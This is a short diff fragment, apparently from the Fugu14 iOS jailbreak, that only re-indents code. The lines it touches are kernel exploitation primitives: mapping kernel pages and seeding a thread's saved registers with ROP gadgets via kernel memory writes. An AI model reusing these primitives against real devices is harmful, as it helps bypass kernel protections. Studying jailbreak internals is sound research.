@@ -19,14 +19,14 @@ void pac_loop(void);
 
 uint64_t mapKernelPage(uint64_t addr)
 {
-    uint64_t page       = addr & ~0x3FFFULL;
-    uint64_t off        = addr & 0x3FFFULL;
-    uint64_t translated = kvtophys(page);
-    void *map = NULL;
-    if (kmap(translated, 0x4000, &map) == 0) {
-        return ((uint64_t)map) + off;
-    }
-    return -1;
+	uint64_t page       = addr & ~0x3FFFULL;
+	uint64_t off        = addr & 0x3FFFULL;
+	uint64_t translated = kvtophys(page);
+	void *map = NULL;
+	if (kmap(translated, 0x4000, &map) == 0) {
+		return ((uint64_t)map) + off;
+	}
+	return -1;
 }
 
 uint64_t getUserReturnThreadContext(void)
@@ -130,8 +130,8 @@ int fugu14_kcall_init(int (^threadSigner)(mach_port_t threadPort))
 	
 	// Write register values
 	uint64_t str_x8_x9_gadget = kgadget(str_x8_x9);
-    uint64_t exception_return_after_check = kgadget(exception_return_after_check);
-    uint64_t brX22 = kgadget(br_x22);
+	uint64_t exception_return_after_check = kgadget(exception_return_after_check);
+	uint64_t brX22 = kgadget(br_x22);
 	kwrite64(actContext + offsetof(kRegisterState, pc),    str_x8_x9_gadget);
 	kwrite32(actContext + offsetof(kRegisterState, cpsr),  CPSR_KERN_INTR_DIS);
 	kwrite64(actContext + offsetof(kRegisterState, lr),    exception_return_after_check);
